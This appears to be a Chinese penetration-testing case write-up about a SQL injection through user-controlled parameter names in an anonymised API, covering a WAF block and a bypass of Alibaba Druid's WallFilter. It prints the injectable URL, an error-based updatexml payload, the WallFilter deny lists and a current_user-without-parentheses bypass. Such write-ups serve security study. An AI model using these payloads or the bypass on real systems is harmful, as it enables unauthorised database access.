# 004-渗透案例：记一次SQL注入_参数名可控



&lt;!--more--&gt;

## 简述
项目上遇到一个有意思的SQL注入，一个GET请求可以自己添加键值，传入的键值会拼接到SQL语句中，造成SQL注入。过程中需要绕过403Waf，和druid WallFilter

漏洞链接：
```
https://xxxxxxx.cn/xxxx-api/xxxx-desk/notice/list?descs=release_time&amp;current=1&amp;size=10&amp;sqli_point=value
```

## 发现过程

本来是怀疑 descs 排序点的注入的，通过 XG_SQL插件进行探测，发现还能自己传键值对进去，真有意思
![img](resource/案例分享-MySQL注入-druid_WallFilter绕过.assets/file-20260114174218142.png)

根据回显的报错语句可以判断，漏洞联接中传入的 sqli_point 会被传输到 LIKE 前，sqli_point 的值则会进行预处理。
```sql
### Error querying database. 
………………
### SQL: SELECT COUNT(*) AS total FROM xxxx_notice WHERE is_deleted = 0 AND (order LIKE ?) AND tenant_id = &#39;000000&#39;
……
```

### 绕WAF

因为服务端会返回报错语句，第一反应就是尝试报错语句。结果被WAF 403了
```
?descs=release_time&amp;current=1&amp;size=10&amp;updatexml(1,concat(0x7e,(version()),0x7e),1)=1
```

![img](resource/案例分享-MySQL注入-druid_WallFilter绕过.assets/file-20260114175500802.png)

一般都是关键词和语义的过滤，尝试探测waf机制

### Druid 的`WallFilter`

传入参数
```
?descs=release_time&amp;current=1&amp;size=10&amp;version()=1
```
触发报错：
```sql
Error querying database.  Cause: java.sql.SQLException: sql injection violation, dbType mysql, druid-version 1.2.16, deny function : version : SELECT COUNT(*) AS total FROM xxxxx_notice WHERE is_deleted = 0 AND (version() LIKE ?) AND tenant_id = &#39;000000&#39;
```

根据报错发现是 Druid 的 WallFilter SQL 注入防护机制

&gt; WallFilter 是阿里巴巴的数据库连接池Druid中一个特殊的 Filter，主要功能是用于监控 SQL 安全，并基于 SQL 语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。

Druid 的`WallFilter`（SQL 防火墙过滤器）是默认开启的，它会检测 SQL 中是否包含黑名单里的函数 / 关键词

黑名单的配置文件

Druid 的配置文件（以 Spring Boot 为例）
```yaml
spring:
  datasource:
    druid:
      # 开启WallFilter（默认开启，此处显式配置）
      wall:
        enabled: true
        # 放行user函数（核心配置）
        config:
          deny-functions: &#39;&#39;  # 清空默认禁用函数，或只保留其他需要禁用的
          # 或精准放行：allow-functions: user
          # 补充：如果是旧版配置方式，可直接设置wall.config.denyFunctions=
```

若使用 XML 配置（非 Spring Boot）：
```xml
&lt;bean id=&#34;wallConfig&#34; class=&#34;com.alibaba.druid.wall.WallConfig&#34;&gt;
    &lt;!-- 清空禁用函数列表，放行user --&gt;
    &lt;property name=&#34;denyFunctions&#34; value=&#34;&#34;/&gt;
    &lt;!-- 或只禁用其他函数，保留user：value=&#34;eval,exec,password&#34; --&gt;
&lt;/bean&gt;
&lt;bean id=&#34;wallFilter&#34; class=&#34;com.alibaba.druid.wall.WallFilter&#34;&gt;
    &lt;property name=&#34;config&#34; ref=&#34;wallConfig&#34;/&gt;
&lt;/bean&gt;
```

[alibaba/druid - WallFilter拦截规则](https://github.com/alibaba/druid/wiki/WallFilter-%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99)

 WallFilter 的默认拦截策略是**不允许 SQL 中带有注释**

原因是默认配置下，WallFilter 拦截了如下函数和关键字：
```yml
deny-function:
  version
  load_file
  database
  schema
  user
  system_user
  session_user
  benchmark
  current_user
  sleep
  xmltype
  receive_message

deny-schema:
  information_schema
  mysql
  performance_schema    

deny-variant:
  basedir
  version_compile_os
  version
  datadir
```

使用 其他函数的替换这些黑名单的函数

这里 current_user 虽然在黑名单里，但是实际过程中还是能执行，这是一个bug。

WallFilter 默认拦截的是函数，当执行 current_user()时会被拦截，但执行 current_user时就不会被拦截
```
&amp;current_user()=1 ==&gt;
Error querying database.  Cause: java.sql.SQLException: sql injection violation, dbType mysql, druid-version 1.2.16, deny function : current_user 

&amp;current_user=1 ==&gt;
成功返回
```


## 参考文献
- [Druid WallFilter 绕过浅析](https://m1r0ku.github.io/posts/Druid-WallFilter.html)
- [WallFilter 拦截函数](https://github.com/alibaba/druid/blob/master/core/src/main/resources/META-INF/druid/wall/mysql/deny-function.txt)
- [Druid拦截功能的配置与简单绕过](https://mp.weixin.qq.com/s/lGalf63VXCva2I5BpmSMgQ)
## 文件属性

创建时间：2026-01-14   16:50

修订记录：
- 2026-01-14 ，此次修订内容| 新建

备注：
XXXXX

---

> 作者: Xavier  
> URL: http://localhost:1313/posts/case-sqli-druid_filter/  

